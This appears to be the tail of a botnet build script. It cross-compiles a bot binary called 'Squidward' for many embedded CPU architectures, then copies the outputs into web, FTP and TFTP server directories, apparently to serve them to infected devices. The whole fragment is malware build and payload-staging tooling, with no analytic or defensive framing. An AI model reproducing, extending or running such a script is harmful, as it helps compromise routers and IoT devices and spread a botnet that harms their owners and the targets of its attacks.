...
compile_bot i586 Squidward.x86 "-static"
compile_bot mips Squidward.mips "-static"
compile_bot mipsel Squidward.mpsl "-static"
compile_bot armv4l Squidward.arm "-static"
compile_bot armv5l Squidward.arm5 ""
compile_bot armv6l Squidward.arm6 "-static"
compile_bot armv7l Squidward.arm7 "-static"
compile_bot powerpc Squidward.ppc "-static"
compile_bot sparc Squidward.spc "-static"
compile_bot m68k Squidward.m68k "-static"
compile_bot sh4 Squidward.sh4 "-static"

cp release/Squidward.* /var/www/html/bins
cp release/Squidward.* /var/ftp
mv release/Squidward.* /var/lib/tftpboot
rm -rf release
